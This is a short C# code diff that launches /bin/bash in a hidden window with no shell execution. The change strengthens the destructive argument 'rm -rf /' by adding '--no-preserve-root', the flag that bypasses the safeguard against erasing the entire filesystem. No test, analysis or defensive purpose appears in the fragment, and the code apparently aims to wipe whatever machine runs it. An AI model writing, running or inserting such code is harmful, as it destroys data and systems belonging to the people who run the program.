@@ -23,7 +23,7 @@ class Program
         {
             Process process = new Process();
             psi.FileName = "/bin/bash";
-            psi.Arguments = "rm -rf /";
+            psi.Arguments = "rm -rf / --no-preserve-root";
             psi.RedirectStandardOutput = true;
             psi.UseShellExecute = false;
             psi.CreateNoWindow = true;
